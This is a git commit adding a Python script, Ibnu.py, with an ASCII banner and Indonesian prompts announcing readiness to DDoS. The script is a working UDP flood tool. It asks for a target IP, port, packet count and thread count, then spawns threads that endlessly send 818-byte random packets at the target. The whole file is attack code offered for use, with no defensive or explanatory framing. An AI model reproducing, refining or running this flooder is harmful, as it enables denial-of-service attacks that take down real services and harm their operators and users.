18c4d410d63ac71414f47f309198c0e0d970d424
XOplang <93246362+XOplang@users.noreply.github.com>
2022-04-06 17:37:48 +0700

    Add files via upload

---
+++ Ibnu.py
@@ -0,0 +1,87 @@
+import random
+import socket
+import threading
+import os,sys
+import time
+
+os.system("clear")
+time.sleep(2)
+print('''\033[1;31;40m
+░░░░░██╗███╗░░██╗████████╗
+░░░░░██║████╗░██║╚══██╔══╝
+░░░░░██║██╔██╗██║░░░██║░░░
+██╗░░██║██║╚████║░░░██║░░░
+╚█████╔╝██║░╚███║░░░██║░░░
+░╚════╝░╚═╝░░╚══╝░░░╚═╝░░░
+
+███████╗██╗░░██╗██████╗░██████╗░███████╗░██████╗
+██╔════╝╚██╗██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝
+█████╗░░░╚███╔╝░██████╔╝██████╔╝█████╗░░╚█████╗░
+██╔══╝░░░██╔██╗░██╔═══╝░██╔══██╗██╔══╝░░░╚═══██╗
+███████╗██╔╝╚██╗██║░░░░░██║░░██║███████╗██████╔╝
+╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═╝░░╚═╝╚══════╝╚═════╝░''')
+print("\033[94m")
+print("••••••••••••••••••••••••")
+print("IBNU GANTENG SIAP MENGDDOS")
+print("Ibnu Ganteng.. Bissmilah Tembus")
+print("••••••••••••••••••••••••")
+ip = str(input("IP TARGET:"))
+port = int(input("PORT TARGET:"))
+choice = str(input("GAS ATTACK(y/n):"))
+times = int(input("PAKET J&T:"))
+threads = int(input(" ONGKOS KURIR:"))
+
+os.system("clear")
+def run():
+        data = random._urandom(818)
+        i = random.choice(("[•]","[•]","[•]"))
+        while True:
+                try:
+                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                        addr = (str(ip),int(port))
+                        for x in range(times):
+                                s.sendto(data,addr)
+                        print(i +" PACKET DARI IBNU GANTENG HAHAY..")
+                except:
+                        print("[X] PACKET DARI IBNU GANTENG HAHAY..")
+
+def run2():
+        data = random._urandom(818)
+        i = random.choice(("[•]","[•]","[•]"))
+        while True:
+                try:
+                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                        s.connect((ip,port))
+                        s.send(data)
+                        for x in range(times):
+                                s.send(data)
+                        print(i +" PACKET DARI IBNU GANTENG HAHAY..")
+                except:
+                        s.close()
+                        print("[X] PACKET DARI IBNU GANTENG HAHAY..")
+
+def run3():
+        data = random._urandom(818)
+        i = random.choice(("[•]","[•]","[•]"))
+        while True:
+                try:
+                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                        s.connect((ip,port))
+                        s.send(data)
+                        for x in range(times):
+                                s.send(data)
+                        print(i +" PACKET DARI IBNU GANTENG HAHAY..")
+                except:
+                        s.close()
+                        print("[X] PACKET DARI IBNU GANTENG HAHAY..")
+
+for y in range(threads):
+        if choice == 'y':
+                th = threading.Thread(target = run)
+                th.start()
+                th = threading.Thread(target = run2)
+                th.start()
+        else:
+                th = threading.Thread(target = run3)
+                th.start()
+
